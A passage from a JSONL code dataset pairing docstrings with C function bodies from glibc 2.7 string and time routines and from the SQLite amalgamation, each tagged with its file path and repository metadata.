ALOG2_HOURS_PER_BIENNIUM)\n\t + SHR (min, ALOG2_MINUTES_PER_BIENNIUM)\n\t + (LEAP_SECONDS_POSSIBLE\n\t    ? 0\n\t    : SHR (sec, ALOG2_SECONDS_PER_BIENNIUM)));\n\n      int approx_biennia = SHR (t0, ALOG2_SECONDS_PER_BIENNIUM);\n      int diff = approx_biennia - approx_requested_biennia;\n      int abs_diff = diff < 0 ? - diff : diff;\n\n      /* IRIX 4.0.5 cc miscaculates TIME_T_MIN / 3: it erroneously\n\t gives a positive value of 715827882.  Setting a variable\n\t first then doing math on it seems to work.\n\t (ghazi@caip.rutgers.edu) */\n      time_t time_t_max = TIME_T_MAX;\n      time_t time_t_min = TIME_T_MIN;\n      time_t overflow_threshold =\n\t(time_t_max / 3 - time_t_min / 3) >> ALOG2_SECONDS_PER_BIENNIUM;\n\n      if (overflow_threshold < abs_diff)\n\t{\n\t  /* Overflow occurred.  Try repairing it; this might work if\n\t     the time zone offset is enough to undo the overflow.  */\n\t  time_t repaired_t0 = -1 - t0;\n\t  approx_biennia = SHR (repaired_t0, ALOG2_SECONDS_PER_BIENNIUM);\n\t  diff = approx_biennia - approx_requested_biennia;\n\t  abs_diff = diff < 0 ? - diff : diff;\n\t  if (overflow_threshold < abs_diff)\n\t    return -1;\n\t  guessed_offset += repaired_t0 - t0;\n\t  t0 = repaired_t0;\n\t}\n    }\n\n  /* Repeatedly use the error to improve the guess.  */\n\n  for (t = t1 = t2 = t0, dst2 = 0;\n       (gt = guess_time_tm (year, yday, hour, min, sec, &t,\n\t\t\t    ranged_convert (convert, &t, &tm)),\n\tt != gt);\n       t1 = t2, t2 = t, t = gt, dst2 = tm.tm_isdst != 0)\n    if (t == t1 && t != t2\n\t&& (tm.tm_isdst < 0\n\t    || (isdst < 0\n\t\t? dst2 <= (tm.tm_isdst != 0)\n\t\t: (isdst != 0) != (tm.tm_isdst != 0))))\n      /* We can't possibly find a match, as we are oscillating\n\t between two values.  The requested time probably falls\n\t within a spring-forward gap of size GT - T.  Follow the common\n\t practice in this case, which is to return a time that is GT - T\n\t away from the requested time, preferring a time whose\n\t tm_isdst differs from the requested value.  (If no tm_isdst\n\t was requested and only one of the two values has a nonzero\n\t tm_isdst, prefer that value.)  In practice, this is more\n\t useful than returning -1.  */\n      goto offset_found;\n    else if (--remaining_probes == 0)\n      return -1;\n\n  /* We have a match.  Check whether tm.tm_isdst has the requested\n     value, if any.  */\n  if (isdst != tm.tm_isdst && 0 <= isdst && 0 <= tm.tm_isdst)\n    {\n      /* tm.tm_isdst has the wrong value.  Look for a neighboring\n\t time with the right value, and use its UTC offset.\n\n\t Heuristic: probe the adjacent timestamps in both directions,\n\t looking for the desired isdst.  This should work for all real\n\t time zone histories in the tz database.  */\n\n      /* Distance between probes when looking for a DST boundary.  In\n\t tzdata2003a, the shortest period of DST is 601200 seconds\n\t (e.g., America/Recife starting 2000-10-08 01:00), and the\n\t shortest period of non-DST surrounded by DST is 694800\n\t seconds (Africa/Tunis starting 1943-04-17 01:00).  Use the\n\t minimum of these two values, so we don't miss these short\n\t periods when probing.  */\n      int stride = 601200;\n\n      /* The longest period of DST in tzdata2003a is 536454000 seconds\n\t (e.g., America/Jujuy starting 1946-10-01 01:00).  The longest\n\t period of non-DST is much longer, but it makes no real sense\n\t to search for more than a year of non-DST, so use the DST\n\t max.  */\n      int duration_max = 536454000;\n\n      /* Search in both directions, so the maximum distance is half\n\t the duration; add the stride to avoid off-by-1 problems.  */\n      int delta_bound = duration_max / 2 + stride;\n\n      int delta, direction;\n\n      for (delta = stride; delta < delta_bound; delta += stride)\n\tfor (direction = -1; direction <= 1; direction += 2)\n\t  {\n\t    time_t ot = t + delta * direction;\n\t    if ((ot < t) == (direction < 0))\n\t      {\n\t\tstruct tm otm;\n\t\tranged_convert (convert, &ot, &otm);\n\t\tif (otm.tm_isdst == isdst)\n\t\t  {\n\t\t    /* We found the desired tm_isdst.\n\t\t       Extrapolate back to the desired time.  */\n\t\t    t = guess_time_tm (year, yday, hour, min, sec, &ot, &otm);\n\t\t    ranged_convert (convert, &t, &tm);\n\t\t    goto offset_found;\n\t\t  }\n\t      }\n\t  }\n    }\n\n offset_found:\n  *offset = guessed_offset + t - t0;\n\n  if (LEAP_SECONDS_POSSIBLE && sec_requested != tm.tm_sec)\n    {\n      /* Adjust time to reflect the tm_sec requested, not the normalized value.\n\t Also, repair any damage from a false match due to a leap second.  */\n      int sec_adjustment = (sec == 0 && tm.tm_sec == 60) - sec;\n      t1 = t + sec_requested;\n      t2 = t1 + sec_adjustment;\n      if (((t1 < t) != (sec_requested < 0))\n\t  | ((t2 < t1) != (sec_adjustment < 0))\n\t  | ! convert (&t2, &tm))\n\treturn -1;\n      t = t2;\n    }\n\n  *tp = tm;\n  return t;\n}", "path": "bin\\glibc-2.7\\time\\mktime.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Append BUF, of length BUF_LEN to *TO, of length *TO_LEN, reallocating and\n   updating *TO & *TO_LEN appropriately.  If an allocation error occurs,\n   *TO's old value is freed, and *TO is set to 0.  */\n", "func_signal": "static void\nstr_append (char **to, size_t *to_len, const char *buf, const size_t buf_len)", "code": "{\n  size_t new_len = *to_len + buf_len;\n  char *new_to = realloc (*to, new_len + 1);\n\n  if (new_to)\n    {\n      *((char *) __mempcpy (new_to + *to_len, buf, buf_len)) = '\\0';\n      *to = new_to;\n      *to_len = new_len;\n    }\n  else\n    {\n      free (*to);\n      *to = 0;\n    }\n}", "path": "bin\\glibc-2.7\\string\\argz-replace.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Make a '\\0' separated arg vector from a unix argv vector, returning it in\n   ARGZ, and the total length in LEN.  If a memory allocation error occurs,\n   ENOMEM is returned, otherwise 0.  */\n", "func_signal": "error_t\n__argz_create (char *const argv[], char **argz, size_t *len)", "code": "{\n  int argc;\n  size_t tlen = 0;\n  char *const *ap;\n  char *p;\n\n  for (argc = 0; argv[argc] != NULL; ++argc)\n    tlen += strlen (argv[argc]) + 1;\n\n  if (tlen == 0)\n    *argz = NULL;\n  else\n    {\n      *argz = malloc (tlen);\n      if (*argz == NULL)\n\treturn ENOMEM;\n\n      for (p = *argz, ap = argv; *ap; ++ap, ++p)\n\tp = __stpcpy (p, *ap);\n    }\n  *len = tlen;\n\n  return 0;\n}", "path": "bin\\glibc-2.7\\string\\argz-create.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Find the last occurrence of C in S.  */\n", "func_signal": "char *\nstrrchr (const char *s, int c)", "code": "{\n  register const char *found, *p;\n\n  c = (unsigned char) c;\n\n  /* Since strchr is fast, we use it rather than the obvious loop.  */\n\n  if (c == '\\0')\n    return strchr (s, '\\0');\n\n  found = NULL;\n  while ((p = strchr (s, c)) != NULL)\n    {\n      found = p;\n      s = p + 1;\n    }\n\n  return (char *) found;\n}", "path": "bin\\glibc-2.7\\string\\strrchr.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Use CONVERT to convert *T to a broken down time in *TP.\n   If *T is out of range for conversion, adjust it so that\n   it is the nearest in-range value and then convert that.  */\n", "func_signal": "static struct tm *\nranged_convert (struct tm *(*convert) (const time_t *, struct tm *),\n\t\ttime_t *t, struct tm *tp)", "code": "{\n  struct tm *r = convert (t, tp);\n\n  if (!r && *t)\n    {\n      time_t bad = *t;\n      time_t ok = 0;\n\n      /* BAD is a known unconvertible time_t, and OK is a known good one.\n\t Use binary search to narrow the range between BAD and OK until\n\t they differ by 1.  */\n      while (bad != ok + (bad < 0 ? -1 : 1))\n\t{\n\t  time_t mid = *t = (bad < 0\n\t\t\t     ? bad + ((ok - bad) >> 1)\n\t\t\t     : ok + ((bad - ok) >> 1));\n\t  r = convert (t, tp);\n\t  if (r)\n\t    ok = mid;\n\t  else\n\t    bad = mid;\n\t}\n\n      if (!r && ok)\n\t{\n\t  /* The last conversion attempt failed;\n\t     revert to the most recent successful attempt.  */\n\t  *t = ok;\n\t  r = convert (t, tp);\n\t}\n    }\n\n  return r;\n}", "path": "bin\\glibc-2.7\\time\\mktime.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Remove the entry for NAME from ENVZ & ENVZ_LEN, if any.  */\n", "func_signal": "void\nenvz_remove (char **envz, size_t *envz_len, const char *name)", "code": "{\n  char *entry = envz_entry (*envz, *envz_len, name);\n  if (entry)\n    argz_delete (envz, envz_len, entry);\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Returns a pointer to the entry in ENVZ for NAME, or 0 if there is none.\n   If NAME contains the separator character, only the portion before it is\n   used in the comparison.  */\n", "func_signal": "char *\nenvz_entry (const char *envz, size_t envz_len, const char *name)", "code": "{\n  while (envz_len)\n    {\n      const char *p = name;\n      const char *entry = envz;\t/* Start of this entry. */\n\n      /* See how far NAME and ENTRY match.  */\n      while (envz_len && *p == *envz && *p && *p != SEP)\n\tp++, envz++, envz_len--;\n\n      if ((*envz == '\\0' || *envz == SEP) && (*p == '\\0' || *p == SEP))\n\t/* Bingo! */\n\treturn (char *) entry;\n\n      /* No match, skip to the next entry.  */\n      while (envz_len && *envz)\n\tenvz++, envz_len--;\n      if (envz_len)\n\tenvz++, envz_len--;\t/* skip '\\0' */\n    }\n\n  return 0;\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Remove null entries.  */\n", "func_signal": "void\nenvz_strip (char **envz, size_t *envz_len)", "code": "{\n  char *entry = *envz;\n  size_t left = *envz_len;\n  while (left)\n    {\n      size_t entry_len = strlen (entry) + 1;\n      left -= entry_len;\n      if (! strchr (entry, SEP))\n\t/* Null entry. */\n\tmemmove (entry, entry + entry_len, left);\n      else\n\tentry += entry_len;\n    }\n  *envz_len = entry - *envz;\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Find the length of S, but scan at most MAXLEN characters.  If no\n   '\\0' terminator is found in that many characters, return MAXLEN.  */\n", "func_signal": "size_t\n__strnlen (const char *str, size_t maxlen)", "code": "{\n  const char *char_ptr, *end_ptr = str + maxlen;\n  const unsigned long int *longword_ptr;\n  unsigned long int longword, magic_bits, himagic, lomagic;\n\n  if (maxlen == 0)\n    return 0;\n\n  if (__builtin_expect (end_ptr < str, 0))\n    end_ptr = (const char *) ~0UL;\n\n  /* Handle the first few characters by reading one character at a time.\n     Do this until CHAR_PTR is aligned on a longword boundary.  */\n  for (char_ptr = str; ((unsigned long int) char_ptr\n\t\t\t& (sizeof (longword) - 1)) != 0;\n       ++char_ptr)\n    if (*char_ptr == '\\0')\n      {\n\tif (char_ptr > end_ptr)\n\t  char_ptr = end_ptr;\n\treturn char_ptr - str;\n      }\n\n  /* All these elucidatory comments refer to 4-byte longwords,\n     but the theory applies equally well to 8-byte longwords.  */\n\n  longword_ptr = (unsigned long int *) char_ptr;\n\n  /* Bits 31, 24, 16, and 8 of this number are zero.  Call these bits\n     the \"holes.\"  Note that there is a hole just to the left of\n     each byte, with an extra at the end:\n\n     bits:  01111110 11111110 11111110 11111111\n     bytes: AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD\n\n     The 1-bits make sure that carries propagate to the next 0-bit.\n     The 0-bits provide holes for carries to fall into.  */\n  magic_bits = 0x7efefeffL;\n  himagic = 0x80808080L;\n  lomagic = 0x01010101L;\n  if (sizeof (longword) > 4)\n    {\n      /* 64-bit version of the magic.  */\n      /* Do the shift in two steps to avoid a warning if long has 32 bits.  */\n      magic_bits = ((0x7efefefeL << 16) << 16) | 0xfefefeffL;\n      himagic = ((himagic << 16) << 16) | himagic;\n      lomagic = ((lomagic << 16) << 16) | lomagic;\n    }\n  if (sizeof (longword) > 8)\n    abort ();\n\n  /* Instead of the traditional loop which tests each character,\n     we will test a longword at a time.  The tricky part is testing\n     if *any of the four* bytes in the longword in question are zero.  */\n  while (longword_ptr < (unsigned long int *) end_ptr)\n    {\n      /* We tentatively exit the loop if adding MAGIC_BITS to\n\t LONGWORD fails to change any of the hole bits of LONGWORD.\n\n\t 1) Is this safe?  Will it catch all the zero bytes?\n\t Suppose there is a byte with all zeros.  Any carry bits\n\t propagating from its left will fall into the hole at its\n\t least significant bit and stop.  Since there will be no\n\t carry from its most significant bit, the LSB of the\n\t byte to the left will be unchanged, and the zero will be\n\t detected.\n\n\t 2) Is this worthwhile?  Will it ignore everything except\n\t zero bytes?  Suppose every byte of LONGWORD has a bit set\n\t somewhere.  There will be a carry into bit 8.  If bit 8\n\t is set, this will carry into bit 16.  If bit 8 is clear,\n\t one of bits 9-15 must be set, so there will be a carry\n\t into bit 16.  Similarly, there will be a carry into bit\n\t 24.  If one of bits 24-30 is set, there will be a carry\n\t into bit 31, so all of the hole bits will be changed.\n\n\t The one misfire occurs when bits 24-30 are clear and bit\n\t 31 is set; in this case, the hole at bit 31 is not\n\t changed.  If we had access to the processor carry flag,\n\t we could close this loophole by putting the fourth hole\n\t at bit 32!\n\n\t So it ignores everything except 128's, when they're aligned\n\t properly.  */\n\n      longword = *longword_ptr++;\n\n      if ((longword - lomagic) & himagic)\n\t{\n\t  /* Which of the bytes was the zero?  If none of them were, it was\n\t     a misfire; continue the search.  */\n\n\t  const char *cp = (const char *) (longword_ptr - 1);\n\n\t  char_ptr = cp;\n\t  if (cp[0] == 0)\n\t    break;\n\t  char_ptr = cp + 1;\n\t  if (cp[1] == 0)\n\t    break;\n\t  char_ptr = cp + 2;\n\t  if (cp[2] == 0)\n\t    break;\n\t  char_ptr = cp + 3;\n\t  if (cp[3] == 0)\n\t    break;\n\t  if (sizeof (longword) > 4)\n\t    {\n\t      char_ptr = cp + 4;\n\t      if (cp[4] == 0)\n\t\tbreak;\n\t      char_ptr = cp + 5;\n\t      if (cp[5] == 0)\n\t\tbreak;\n\t      char_ptr = cp + 6;\n\t      if (cp[6] == 0)\n\t\tbreak;\n\t      char_ptr = cp + 7;\n\t      if (cp[7] == 0)\n\t\tbreak;\n\t    }\n\t}\n      char_ptr = end_ptr;\n    }\n\n  if (char_ptr > end_ptr)\n    char_ptr = end_ptr;\n  return char_ptr - str;\n}", "path": "bin\\glibc-2.7\\string\\strnlen.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Return a string describing the errno code in ERRNUM.  */\n", "func_signal": "char *\n__strerror_r (int errnum, char *buf, size_t buflen)", "code": "{\n  if (__builtin_expect (errnum < 0 || errnum >= _sys_nerr_internal\n\t\t\t|| _sys_errlist_internal[errnum] == NULL, 0))\n    {\n      /* Buffer we use to print the number in.  For a maximum size for\n\t `int' of 8 bytes we never need more than 20 digits.  */\n      char numbuf[21];\n      const char *unk = _(\"Unknown error \");\n      const size_t unklen = strlen (unk);\n      char *p, *q;\n\n      numbuf[20] = '\\0';\n      p = _itoa_word (errnum, &numbuf[20], 10, 0);\n\n      /* Now construct the result while taking care for the destination\n\t buffer size.  */\n      q = __mempcpy (buf, unk, MIN (unklen, buflen));\n      if (unklen < buflen)\n\tmemcpy (q, p, MIN ((size_t) (&numbuf[21] - p), buflen - unklen));\n\n      /* Terminate the string in any case.  */\n      if (buflen > 0)\n\tbuf[buflen - 1] = '\\0';\n\n      return buf;\n    }\n\n  return (char *) _(_sys_errlist_internal[errnum]);\n}", "path": "bin\\glibc-2.7\\string\\_strerror.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Return the time used by the program so far (user time + system time).  */\n", "func_signal": "clock_t\nclock ()", "code": "{\n  __set_errno (ENOSYS);\n  return (clock_t) -1;\n}", "path": "bin\\glibc-2.7\\time\\clock.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Make '\\0' separated arg vector ARGZ printable by converting all the '\\0's\n   except the last into the character SEP.  */\n", "func_signal": "void\n__argz_stringify (char *argz, size_t len, int sep)", "code": "{\n  if (len > 0)\n    while (1)\n      {\n\tsize_t part_len = __strnlen (argz, len);\n\targz += part_len;\n\tlen -= part_len;\n\tif (len-- <= 1)\t\t/* includes final '\\0' we want to stop at */\n\t  break;\n\t*argz++ = sep;\n      }\n}", "path": "bin\\glibc-2.7\\string\\argz-stringify.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Return a time_t value corresponding to (YEAR-YDAY HOUR:MIN:SEC),\n   assuming that *T corresponds to *TP and that no clock adjustments\n   occurred between *TP and the desired time.\n   If TP is null, return a value not equal to *T; this avoids false matches.\n   If overflow occurs, yield the minimal or maximal value, except do not\n   yield a value equal to *T.  */\n", "func_signal": "static time_t\nguess_time_tm (long int year, long int yday, int hour, int min, int sec,\n\t       const time_t *t, const struct tm *tp)", "code": "{\n  if (tp)\n    {\n      time_t d = ydhms_diff (year, yday, hour, min, sec,\n\t\t\t     tp->tm_year, tp->tm_yday,\n\t\t\t     tp->tm_hour, tp->tm_min, tp->tm_sec);\n      time_t t1 = *t + d;\n      if ((t1 < *t) == (TYPE_SIGNED (time_t) ? d < 0 : TIME_T_MAX / 2 < d))\n\treturn t1;\n    }\n\n  /* Overflow occurred one way or another.  Return the nearest result\n     that is actually in range, except don't report a zero difference\n     if the actual difference is nonzero, as that would cause a false\n     match; and don't oscillate between two values, as that would\n     confuse the spring-forward gap detector.  */\n  return (*t < TIME_T_MIDPOINT\n\t  ? (*t <= TIME_T_MIN + 1 ? *t + 1 : TIME_T_MIN)\n\t  : (TIME_T_MAX - 1 <= *t ? *t - 1 : TIME_T_MAX));\n}", "path": "bin\\glibc-2.7\\time\\mktime.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Replace any occurrences of the string STR in ARGZ with WITH, reallocating\n   ARGZ as necessary.  If REPLACE_COUNT is non-zero, *REPLACE_COUNT will be\n   incremented by number of replacements performed.  */\n", "func_signal": "error_t\n__argz_replace (char **argz, size_t *argz_len, const char *str, const char *with,\n\t\tunsigned *replace_count)", "code": "{\n  error_t err = 0;\n\n  if (str && *str)\n    {\n      char *arg = 0;\n      char *src = *argz;\n      size_t src_len = *argz_len;\n      char *dst = 0;\n      size_t dst_len = 0;\n      int delayed_copy = 1;\t/* True while we've avoided copying anything.  */\n      size_t str_len = strlen (str), with_len = strlen (with);\n\n      while (!err && (arg = argz_next (src, src_len, arg)))\n\t{\n\t  char *match = strstr (arg, str);\n\t  if (match)\n\t    {\n\t      char *from = match + str_len;\n\t      size_t to_len = match - arg;\n\t      char *to = __strndup (arg, to_len);\n\n\t      while (to && from)\n\t\t{\n\t\t  str_append (&to, &to_len, with, with_len);\n\t\t  if (to)\n\t\t    {\n\t\t      match = strstr (from, str);\n\t\t      if (match)\n\t\t\t{\n\t\t\t  str_append (&to, &to_len, from, match - from);\n\t\t\t  from = match + str_len;\n\t\t\t}\n\t\t      else\n\t\t\t{\n\t\t\t  str_append (&to, &to_len, from, strlen (from));\n\t\t\t  from = 0;\n\t\t\t}\n\t\t    }\n\t\t}\n\n\t      if (to)\n\t\t{\n\t\t  if (delayed_copy)\n\t\t    /* We avoided copying SRC to DST until we found a match;\n                       now that we've done so, copy everything from the start\n                       of SRC.  */\n\t\t    {\n\t\t      if (arg > src)\n\t\t\terr = __argz_append (&dst, &dst_len, src, (arg - src));\n\t\t      delayed_copy = 0;\n\t\t    }\n\t\t  if (! err)\n\t\t    err = __argz_add (&dst, &dst_len, to);\n\t\t  free (to);\n\t\t}\n\t      else\n\t\terr = ENOMEM;\n\n\t      if (replace_count)\n\t\t(*replace_count)++;\n\t    }\n\t  else if (! delayed_copy)\n\t    err = __argz_add (&dst, &dst_len, arg);\n\t}\n\n      if (! err)\n\t{\n\t  if (! delayed_copy)\n\t    /* We never found any instances of str.  */\n\t    {\n\t      free (src);\n\t      *argz = dst;\n\t      *argz_len = dst_len;\n\t    }\n\t}\n      else if (dst_len > 0)\n\tfree (dst);\n    }\n\n  return err;\n}", "path": "bin\\glibc-2.7\\string\\argz-replace.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Adds each entry in ENVZ2 to ENVZ & ENVZ_LEN, as if with envz_add().  If\n   OVERRIDE is true, then values in ENVZ2 will supersede those with the same\n   name in ENV, otherwise not.  */\n", "func_signal": "error_t\nenvz_merge (char **envz, size_t *envz_len, const char *envz2,\n\t    size_t envz2_len, int override)", "code": "{\n  error_t err = 0;\n\n  while (envz2_len && ! err)\n    {\n      char *old = envz_entry (*envz, *envz_len, envz2);\n      size_t new_len = strlen (envz2) + 1;\n\n      if (! old)\n\terr = __argz_append (envz, envz_len, envz2, new_len);\n      else if (override)\n\t{\n\t  argz_delete (envz, envz_len, old);\n\t  err = __argz_append (envz, envz_len, envz2, new_len);\n\t}\n\n      envz2 += new_len;\n      envz2_len -= new_len;\n    }\n\n  return err;\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/*\n** Position the pCsr->pStmt statement so that it is on the row\n** of the %_content table that contains the last match.  Return\n** SQLITE_OK on success.  \n*/\n", "func_signal": "static int fts3CursorSeek(sqlite3_context *pContext, Fts3Cursor *pCsr)", "code": "{\n  int rc = SQLITE_OK;\n  if( pCsr->isRequireSeek ){\n    sqlite3_stmt *pStmt = 0;\n\n    rc = fts3CursorSeekStmt(pCsr, &pStmt);\n    if( rc==SQLITE_OK ){\n      sqlite3_bind_int64(pCsr->pStmt, 1, pCsr->iPrevId);\n      pCsr->isRequireSeek = 0;\n      if( SQLITE_ROW==sqlite3_step(pCsr->pStmt) ){\n        return SQLITE_OK;\n      }else{\n        rc = sqlite3_reset(pCsr->pStmt);\n        if( rc==SQLITE_OK && ((Fts3Table *)pCsr->base.pVtab)->zContentTbl==0 ){\n          /* If no row was found and no error has occured, then the %_content\n          ** table is missing a row that is present in the full-text index.\n          ** The data structures are corrupt.  */\n          rc = FTS_CORRUPT_VTAB;\n          pCsr->isEof = 1;\n        }\n      }\n    }\n  }\n\n  if( rc!=SQLITE_OK && pContext ){\n    sqlite3_result_error_code(pContext, rc);\n  }\n  return rc;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** If zNum represents an integer that will fit in 32-bits, then set\n** *pValue to that integer and return true.  Otherwise return false.\n**\n** Any non-numeric characters that following zNum are ignored.\n** This is different from sqlite3Atoi64() which requires the\n** input number to be zero-terminated.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3GetInt32(const char *zNum, int *pValue)", "code": "{\n  sqlite_int64 v = 0;\n  int i, c;\n  int neg = 0;\n  if( zNum[0]=='-' ){\n    neg = 1;\n    zNum++;\n  }else if( zNum[0]=='+' ){\n    zNum++;\n  }\n  while( zNum[0]=='0' ) zNum++;\n  for(i=0; i<11 && (c = zNum[i] - '0')>=0 && c<=9; i++){\n    v = v*10 + c;\n  }\n\n  /* The longest decimal representation of a 32 bit integer is 10 digits:\n  **\n  **             1234567890\n  **     2^31 -> 2147483648\n  */\n  testcase( i==10 );\n  if( i>10 ){\n    return 0;\n  }\n  testcase( v-neg==2147483647 );\n  if( v-neg>2147483647 ){\n    return 0;\n  }\n  if( neg ){\n    v = -v;\n  }\n  *pValue = (int)v;\n  return 1;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Called when we are unable to satisfy an allocation of nBytes.\n*/\n", "func_signal": "static void memsys3OutOfMemory(int nByte)", "code": "{\n  if( !mem3.alarmBusy ){\n    mem3.alarmBusy = 1;\n    assert( sqlite3_mutex_held(mem3.mutex) );\n    sqlite3_mutex_leave(mem3.mutex);\n    sqlite3_release_memory(nByte);\n    sqlite3_mutex_enter(mem3.mutex);\n    mem3.alarmBusy = 0;\n  }\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Translate a single byte of Hex into an integer.\n** This routine only works if h really is a valid hexadecimal\n** character:  0..9a..fA..F\n*/\n", "func_signal": "SQLITE_PRIVATE u8 sqlite3HexToInt(int h)", "code": "{\n  assert( (h>='0' && h<='9') ||  (h>='a' && h<='f') ||  (h>='A' && h<='F') );\n#ifdef SQLITE_ASCII\n  h += 9*(1&(h>>6));\n#endif\n#ifdef SQLITE_EBCDIC\n  h += 9*(1&~(h>>4));\n#endif\n  return (u8)(h & 0xf);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Call this routine when the database connection is closing in order\n** to clean up loaded extensions\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3CloseExtensions(sqlite3 *db)", "code": "{\n  int i;\n  assert( sqlite3_mutex_held(db->mutex) );\n  for(i=0; i<db->nExtension; i++){\n    sqlite3OsDlClose(db->pVfs, db->aExtension[i]);\n  }\n  sqlite3DbFree(db, db->aExtension);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** These routines are Walker callbacks.  Walker.u.pi is a pointer\n** to an integer.  These routines are checking an expression to see\n** if it is a constant.  Set *Walker.u.pi to 0 if the expression is\n** not constant.\n**\n** These callback routines are used to implement the following:\n**\n**     sqlite3ExprIsConstant()\n**     sqlite3ExprIsConstantNotJoin()\n**     sqlite3ExprIsConstantOrFunction()\n**\n*/\n", "func_signal": "static int exprNodeIsConstant(Walker *pWalker, Expr *pExpr)", "code": "{\n\n  /* If pWalker->u.i is 3 then any term of the expression that comes from\n  ** the ON or USING clauses of a join disqualifies the expression\n  ** from being considered constant. */\n  if( pWalker->u.i==3 && ExprHasAnyProperty(pExpr, EP_FromJoin) ){\n    pWalker->u.i = 0;\n    return WRC_Abort;\n  }\n\n  switch( pExpr->op ){\n    /* Consider functions to be constant if all their arguments are constant\n    ** and pWalker->u.i==2 */\n    case TK_FUNCTION:\n      if( pWalker->u.i==2 ) return 0;\n      /* Fall through */\n    case TK_ID:\n    case TK_COLUMN:\n    case TK_AGG_FUNCTION:\n    case TK_AGG_COLUMN:\n      testcase( pExpr->op==TK_ID );\n      testcase( pExpr->op==TK_COLUMN );\n      testcase( pExpr->op==TK_AGG_FUNCTION );\n      testcase( pExpr->op==TK_AGG_COLUMN );\n      pWalker->u.i = 0;\n      return WRC_Abort;\n    default:\n      testcase( pExpr->op==TK_SELECT ); /* selectNodeIsConstant will disallow */\n      testcase( pExpr->op==TK_EXISTS ); /* selectNodeIsConstant will disallow */\n      return WRC_Continue;\n  }\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** This is the top-level implementation of sqlite3_step().  Call\n** sqlite3Step() to do most of the work.  If a schema error occurs,\n** call sqlite3Reprepare() and try again.\n*/\n", "func_signal": "SQLITE_API int sqlite3_step(sqlite3_stmt *pStmt)", "code": "{\n  int rc = SQLITE_OK;      /* Result from sqlite3Step() */\n  int rc2 = SQLITE_OK;     /* Result from sqlite3Reprepare() */\n  Vdbe *v = (Vdbe*)pStmt;  /* the prepared statement */\n  int cnt = 0;             /* Counter to prevent infinite loop of reprepares */\n  sqlite3 *db;             /* The database connection */\n\n  if( vdbeSafetyNotNull(v) ){\n    return SQLITE_MISUSE_BKPT;\n  }\n  db = v->db;\n  sqlite3_mutex_enter(db->mutex);\n  while( (rc = sqlite3Step(v))==SQLITE_SCHEMA\n         && cnt++ < SQLITE_MAX_SCHEMA_RETRY\n         && (rc2 = rc = sqlite3Reprepare(v))==SQLITE_OK ){\n    sqlite3_reset(pStmt);\n    assert( v->expired==0 );\n  }\n  if( rc2!=SQLITE_OK && ALWAYS(v->isPrepareV2) && ALWAYS(db->pErr) ){\n    /* This case occurs after failing to recompile an sql statement. \n    ** The error message from the SQL compiler has already been loaded \n    ** into the database handle. This block copies the error message \n    ** from the database handle into the statement and sets the statement\n    ** program counter to 0 to ensure that when the statement is \n    ** finalized or reset the parser error message is available via\n    ** sqlite3_errmsg() and sqlite3_errcode().\n    */\n    const char *zErr = (const char *)sqlite3_value_text(db->pErr); \n    sqlite3DbFree(db, v->zErrMsg);\n    if( !db->mallocFailed ){\n      v->zErrMsg = sqlite3DbStrDup(db, zErr);\n      v->rc = rc2;\n    } else {\n      v->zErrMsg = 0;\n      v->rc = rc = SQLITE_NOMEM;\n    }\n  }\n  rc = sqlite3ApiExit(db, rc);\n  sqlite3_mutex_leave(db->mutex);\n  return rc;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
